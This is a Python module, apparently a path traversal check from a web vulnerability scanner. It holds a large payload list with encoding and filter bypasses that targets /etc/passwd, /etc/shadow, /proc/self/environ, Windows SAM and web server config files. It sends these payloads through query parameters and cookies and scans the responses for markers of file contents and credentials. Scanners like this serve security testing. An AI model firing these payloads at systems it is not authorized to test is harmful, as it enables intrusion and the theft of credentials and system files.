import requests
import urllib.parse
from . import get_session

# Enhanced path traversal payloads with various encoding and bypass techniques
PATH_TRAVERSAL_PAYLOADS = [
    # Basic directory traversal patterns
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..//..//..//etc//passwd",
    
    # Null byte injection
    "../../../etc/passwd%00.jpg",
    "../../../etc/passwd\x00.jpg",
    
    # Double encoding
    "..%252f..%252f..%252fetc%252fpasswd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    
    # Unicode / UTF-8 encoding
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd", # Unicode fullwidth slash
    
    # Overlong UTF-8 encoding
    "..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd",
    
    # Mixed encoding
    "..%c0%af../..%c0%afetc/passwd",
    "..%255c..%255c..%255cwindows%255cwin.ini",
    
    # Path normalization bypasses
    "....//....//....//etc/passwd",
    "../...//...//etc/passwd",
    
    # Windows specific
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "..%255c..%255c..%255cwindows%255cwin.ini",
    
    # Self-referencing folders (bypass protection mechanisms)
    "/../../../etc/passwd",
    "/./././etc/passwd",
    "/../.././././../etc/passwd",
    
    # Non-standard path separators
    "..;/..;/..;/etc/passwd",
    
    # Common files to check for
    "../../../etc/shadow",
    "../../../proc/self/environ",
    "../../../proc/self/cmdline",
    "../../../var/www/html/config.php",
    "../../../var/www/config.ini",
    "../../../usr/local/etc/apache2/httpd.conf",
    "../../../boot.ini",
    "../../../windows/system32/drivers/etc/hosts",
    "../../../windows/repair/sam",
    "../../../windows/panther/unattend.xml",
    "../../../usr/local/apache2/conf/httpd.conf",
    "../../../etc/httpd/conf/httpd.conf",
    "../../../xampp/apache/conf/httpd.conf",
    
    # Web server specific paths
    "../../../var/log/apache2/access.log",
    "../../../var/log/httpd/access_log",
    "../../../var/log/apache/access.log",
    "../../../var/www/logs/access_log",
    "../../../var/www/logs/access.log",
    
    # Filter bypasses
    "....//....//....//....//etc/passwd",
    ".././.././.././.././etc/passwd",
    "..///////etc/passwd",
    "file:///etc/passwd"
]

def check(target_url, session=None):
    req_session = get_session(session)
    findings = []
    
    # Parse the target URL to extract parameters for testing
    parsed_url = urllib.parse.urlparse(target_url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    
    # Check if there are parameters to test
    if not query_params:
        return findings
    
    # Get baseline response for later comparison
    try:
        baseline_response = req_session.get(target_url, timeout=5)
        baseline_content = baseline_response.text
        baseline_length = len(baseline_content)
        baseline_response.close()
    except Exception:
        return findings
    
    # Indicators of successful path traversal
    success_indicators = [
        "root:x:", # Linux /etc/passwd content
        "[boot loader]", # Windows boot.ini content
        "for 16-bit app support", # Windows win.ini content
        "# hosts file", # hosts file comment
        "<?php", # PHP file start
        "</VirtualHost>", # Apache config
        "httpd.conf", # Apache config file name
        "system32", # Windows system directory
        "HTTP_USER_AGENT", # Environment variables
        "<Directory ", # Apache config directive
        "DocumentRoot", # Apache config directive
        "PATH=", # Environment variable
        "DB_PASSWORD", # Common config entry
        "ACCESS_KEY", # Cloud credentials
        "SECRET_KEY", # Cloud credentials
        "mysqli_connect", # Database connection string
        "database.php", # Database config file
        "unattend.xml", # Windows setup file
        "[drivers]" # Windows config section
    ]
    
    # Test each parameter with each payload
    for param_name, param_values in query_params.items():
        for payload in PATH_TRAVERSAL_PAYLOADS:
            # Create a copy of the original parameters
            new_params = query_params.copy()
            
            # Replace the current parameter with the path traversal payload
            new_params[param_name] = [payload]
            
            # Build the new query string
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            
            # Construct the test URL
            test_url = urllib.parse.urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            try:
                # Send the request with the path traversal payload
                response = req_session.get(test_url, timeout=5)
                content = response.text
                
                # Check for significant differences in response size
                # A successful path traversal might return a different sized response
                content_length_diff = abs(len(content) - baseline_length)
                
                # Check for indicators of successful path traversal
                for indicator in success_indicators:
                    if indicator in content and indicator not in baseline_content:
                        findings.append(f"Potential path traversal in parameter {param_name} using payload: {payload}")
                        break
                
                # Check for significant content length difference (might indicate successful exploitation)
                if content_length_diff > 100 and content_length_diff / baseline_length > 0.3:  # 30% difference threshold
                    findings.append(f"Significant response size change with parameter {param_name} using payload: {payload}")
                
                # Check for error messages that might indicate partial success
                error_indicators = ["Permission denied", "Access denied", "Error opening file", "Failed to open stream"]
                for error in error_indicators:
                    if error in content and error not in baseline_content:
                        findings.append(f"Potential path traversal (with access errors) in parameter {param_name} using payload: {payload}")
                        break
                
                response.close()
            except Exception:
                continue
    
    # Additional test: Check path traversal via cookies if no findings yet
    if not findings:
        cookies_to_test = {
            "PHPSESSID": "../../../etc/passwd",
            "session": "..%2f..%2f..%2fetc%2fpasswd",
            "user_pref": "../../../etc/passwd%00",
            "theme": "../../../windows/win.ini"
        }
        
        for cookie_name, cookie_value in cookies_to_test.items():
            try:
                response = req_session.get(target_url, cookies={cookie_name: cookie_value}, timeout=5)
                content = response.text
                
                for indicator in success_indicators:
                    if indicator in content and indicator not in baseline_content:
                        findings.append(f"Potential path traversal via cookie {cookie_name}")
                        break
                
                response.close()
            except Exception:
                continue
    
    return findings
